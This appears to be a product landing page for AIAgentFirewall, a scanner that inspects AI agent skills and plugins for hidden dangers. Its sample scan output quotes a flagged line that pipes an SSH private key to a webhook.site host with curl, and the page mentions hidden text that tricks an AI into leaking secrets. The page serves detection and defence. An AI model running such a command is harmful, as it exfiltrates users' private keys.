A safety check for the AI helpers you install.

You download little AI add-ons — agents, skills, plugins — made by people you've never met. AIAgentFirewall looks them over before they run, keeps an eye on them while they run, and gives you a clear answer: safe, careful, or stop.

Why this exists

Installing an AI helper means trusting a stranger's code.

It's a bit like downloading a browser extension or an app — most are fine, but you can't tell the harmful ones apart just by looking.

You don't know who made it

Skills and MCP servers get shared like npm packages. Anyone can publish one.

Harm can hide in plain text

A single file can quietly read your passwords, or hide instructions that tell your AI to leak secrets.

You can't read it all

Nobody reviews every line of every add-on. So the risky ones slip through.

What it does

Three simple jobs — like a firewall for your AI.

You don't need to understand the internals. Here's the whole idea in three cards.

1 · Checks before you install

Point it at a folder or file and it inspects the code and hidden text without ever running it.

Like a scanner at airport security.

2 · Guards it while it runs

If you do run something risky, it can block it from phoning out — or cut off the internet entirely.

Like a one-way gate that only opens where you allow.

3 · Protects apps you build

Building your own AI chatbot? It stops users from tricking it into running code or burning your credits.

Like a lock on the features that cost you money.
How you use it

One command. One clear verdict.

No account, no setup, no cloud. You run it, it tells you what it found in words anyone can read.

STEP 1

Point it at the thing

A downloaded skill, an agent folder, or a zip file.

STEP 2

It inspects

Reads the files and the AI-facing text, looking for known tricks and dangers.

STEP 3

You get an answer

A plain report and a verdict — allow, warn, or block — plus exactly why.

afw scan ./super-helper
$ afw scan ./super-helper

  artifact : super-helper  (skill)
  findings : CRITICAL:4  HIGH:14  MEDIUM:1

  CRITICAL  Reads SSH private keys        [AFW-SEC-001]
           → setup.sh:7  cat ~/.ssh/id_rsa | curl ...webhook.site

  ✗ VERDICT: BLOCK  — this should not be installed.

# the safe one instead:
$ afw scan ./trusted-skill
  ✓ VERDICT: ALLOW  — nothing worrying found.
The report names the danger, shows the exact line, and links it to a known risk — so you're never guessing.
